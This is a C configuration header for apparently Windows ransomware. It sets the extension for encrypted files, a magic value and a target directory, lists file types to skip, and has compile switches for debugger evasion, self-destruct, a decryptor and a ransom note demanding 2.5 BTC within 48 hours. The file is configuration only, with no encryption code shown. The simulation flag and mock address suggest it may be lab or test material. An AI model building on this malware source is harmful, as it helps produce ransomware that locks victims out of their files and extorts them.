// config.h
#ifndef CONFIG_H
#define CONFIG_H

#include <windows.h>


#define MAX_THREADS         8
#define ENCRYPT_EXT         L".cb32"   
#define ENCRYPT_MAGIC       0x32334243u 
#define BLACKLISTED_EXTS	L".exe", L".dll", L".sys", L".msi", L".ini", ENCRYPT_EXT, NULL


//#define BUILD_DECRYPTOR  
//#define CONSOLE_STDOUT        
//#define DBG_EVASION   
//#define SELF_DESTRUCT
//#define SIMULATE_RANSOM
#ifdef SIMULATE_RANSOM
#define CONFIG_RANSOM_NOTE \
  "YOUR FILES HAVE BEEN ENCRYPTED!\r\n"  \
  "This is not a joke. Want your data restored?\r\n"  \
  "Send 2.5 BTC to the address below:\r\n"    \
  "1MockBTCAddrxxxxxxxxxxxxxxxxxx\r\n"    \
  "You have 48 hours.\r\n"    
#endif 


#include "override.h"   // builder overwrites this file each run

#ifndef CONFIG_ROOT_DIR
#define CONFIG_ROOT_DIR L"C:\\Users\\Public\\Documents", NULL
#endif


#endif // CONFIG_H